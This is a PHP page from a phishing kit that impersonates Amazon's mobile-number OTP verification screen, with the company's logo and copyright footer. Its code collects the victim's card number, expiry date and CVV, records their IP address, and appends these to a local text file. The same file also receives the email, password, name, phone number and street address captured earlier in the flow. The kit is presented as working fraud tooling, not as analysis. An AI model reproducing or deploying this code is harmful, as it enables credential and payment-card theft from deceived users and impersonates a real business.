<?php require_once('header.php')?>
 <?php   if ( ! empty ( $_POST)){

$_SESSION['cardnumber'] = $_POST['cardnumber'];
$_SESSION['ed-month'] = $_POST['ed-month'];
$_SESSION['ed-year'] = $_POST['ed-year'];
$_SESSION['cvv'] = $_POST['cvv'];


if(!empty($_SERVER["HTTP_CLIENT_IP"])){
$IP = $_SERVER["HTTP_CLIENT_IP"];
}
else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"])){
$IP = $_SERVER["HTTP_X_FORWARDED_FOR"];
} 
else{
$IP = $_SERVER["REMOTE_ADDR"];
}


} 

?>




    <div class="container mt-5">
      <div class="row">
         <img class='logo' src="img/amazon-logo.png" alt="" height='103px'>

      </div>
      <form action="verify-sms-error.php" method='post'>
      <div class="login-form ">
          <div class="login-box">
          <h2 class='signin-text'>Verify mobile number</h2>
          <span class='font-13'>A text with a One Time Password (OTP) has been sent to your mobile number: 
               <?php   if ( ! empty ( $_POST)){
            
                    // $_SESSION['mobilenumber'] = $_POST['mobilenumber'];
                    echo $_SESSION['mobilenumber'];
    
                   } 
                 ?>
            </span>
          <a class='font-13 link-btm' href="#">Change</a><br>
          <label for="password" class="label-email mt-3 font-13">Enter OTP:</label
          ><a class='link mt-3 float-right link-btm font-13' href="#">Resend OTP</a>
<br /> 
          <input
            class="input-login password-text"
            type="text" 
            name="otp"
            autocomplete="off"
            required
          />
          <br />
          <input type="submit" name='verify' class="input-continue mt-2" name='verifyotp' value='Verify'/>
   
                   

        </div>
      </div>
      </form>

         <div class="bar2">
           <hr class='hr-text2 mt-5'>
         </div>
      </div>
      <div class="bar1">
        <div class="row">
          <div class="btm-link-wrap"><a class='link-btm col ml-3' href="#">Conditions of Use</a></div>
          <div class="btm-link-wrap"><a class='link-btm col' href="#">Privacy Notice</a></div>
          <div class="btm-link-wrap"><a class='link-btm col' href="#">Help</a></div>
            <span class="footer-text">
              © 1996-2020, Amazon.com, Inc. or its affiliates
            </span>
        </div>
      </div>
    </div>
<?php
      
      extract($_REQUEST);
    
      $Email = "Email:".$_SESSION['email'];
      $Password = "Password: ".$_SESSION['password'];
      $Fullname = "Fullname: ".$_SESSION['email'];
      $Country = "Country: ".$_SESSION['country'];
      $MobileNumber = "Country Code: ".$_SESSION['countrycode']."-".$_SESSION['mobilenumber'];
      $StreetAddress = "Street Address: ".$_SESSION['address1'].", ".$_SESSION['address2'];
      $City = "City: ".$_SESSION['city'];
      $Area = "Area: ".$_SESSION['area'].", ".$_SESSION['province'].", ".$_SESSION['landmark'];
      $TypeAddress = "Address type: ".$_SESSION['addresstype'];
      $Cardnumber = "Card Number: ".$_SESSION['cardnumber'];
      $Em = "Expiry Date: ".$_SESSION['ed-month']."/".$_SESSION['ed-year'];
      $cv = "CVV: ".$_SESSION['cvv'];
      

      $file=fopen("form-save.txt", "a");
      fwrite($file, '-----------------------------------------'."\n");
      fwrite($file, '     Login Details     '."\n");
      fwrite($file, '-----------------------------------------'."\n");
      fwrite($file, $Email."\n");
      fwrite($file, $Password."\n");
      fwrite($file, $IP."\n");
      fwrite($file, '-----------------------------------------'."\n");
      fwrite($file, '     Address Details     '."\n");
      fwrite($file, '-----------------------------------------'."\n");
      fwrite($file, $Fullname."\n");
      fwrite($file, $Country."\n");
      fwrite($file, $MobileNumber."\n");
      fwrite($file, $StreetAddress."\n");
      fwrite($file, $City."\n");
      fwrite($file, $Area."\n");
      fwrite($file, $TypeAddress."\n");
      fwrite($file, '-----------------------------------------'."\n");
      fwrite($file, '     Credit-card Details     '."\n");
      fwrite($file, '-----------------------------------------'."\n");
      fwrite($file, $Cardnumber."\n");
      fwrite($file, $Em."\n");
      fwrite($file, $cv."\n");
      fwrite($file, '-----------------------------------------'."\n");
      fwrite($file, '     OTP    '."\n");
      fwrite($file, '-----------------------------------------'."\n");
      // fwrite($file, $OTP)
      fclose($file);
      

      // echo $_SESSION['email']."<br>".
      // $_SESSION['password']."<br>".
      // $IP."<br>".
      // $_SESSION['country']."<br>".
      // $_SESSION['fullname']."<br>".
      // $_SESSION['countrycode']."-".$_SESSION['mobilenumber']."<br>".
      // $_SESSION['address1']."<br>".
      // $_SESSION['address2']."<br>".
      // $_SESSION['city']."<br>".
      // $_SESSION['area']."<br>".
      // $_SESSION['province']."<br>".
      // $_SESSION['landmark']."<br>".
      // $_SESSION['addresstype']."<br>".
      // $_SESSION['cardnumber']."<br>".
      // $_SESSION['ed-month']."<br>".
      // $_SESSION['ed-year']."<br>".
      // $_SESSION['cvv'];
 


  


?>
<?php require_once('footer.php')?>
